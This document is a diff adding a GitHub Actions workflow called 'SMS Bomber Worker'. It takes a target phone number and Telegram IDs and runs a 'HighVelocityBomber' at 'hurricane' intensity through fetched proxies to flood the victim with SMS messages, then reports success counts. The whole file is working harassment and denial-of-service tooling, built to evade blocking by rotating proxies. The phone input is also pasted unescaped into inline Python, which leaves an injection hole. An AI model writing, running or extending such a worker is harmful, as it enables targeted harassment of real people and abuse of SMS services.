@@ -1,0 +1,71 @@
+name: SMS Bomber Worker
+
+on:
+  workflow_dispatch:
+    inputs:
+      phone:
+        description: 'Target phone number'
+        required: true
+      chat_id:
+        description: 'Telegram chat ID'
+        required: true
+      user_id:
+        description: 'Telegram user ID'
+        required: true
+
+jobs:
+  bomber:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.11'
+
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install aiohttp aiohttp_socks python-telegram-bot pytz
+
+      - name: Run bomber
+        env:
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+          USER_ID: ${{ github.event.inputs.user_id }}
+          CHAT_ID: ${{ github.event.inputs.chat_id }}
+        run: |
+          python -c "
+          import asyncio
+          import os
+          from src.bomber import HighVelocityBomber
+          from src.proxy_manager import ProxyManager
+          
+          async def main():
+              phone = '${{ github.event.inputs.phone }}'
+              manager = ProxyManager()
+              await manager.fetch_proxies()
+              
+              bomber = HighVelocityBomber(
+                  phone=phone,
+                  bomb_type='sms',
+                  intensity='hurricane',
+                  chat_id=os.getenv('CHAT_ID'),
+                  proxy_manager=manager
+              )
+              await bomber.start_attack()
+              
+              # Report results
+              total = bomber.success + bomber.failed
+              success_rate = bomber.success / total * 100 if total > 0 else 0
+              print(f'Worker completed: {bomber.success} success, {bomber.failed} failed')
+              
+          asyncio.run(main())
+          "
+
+      - name: Notify completion
+        if: always()
+        run: |
+          echo "Worker job completed"
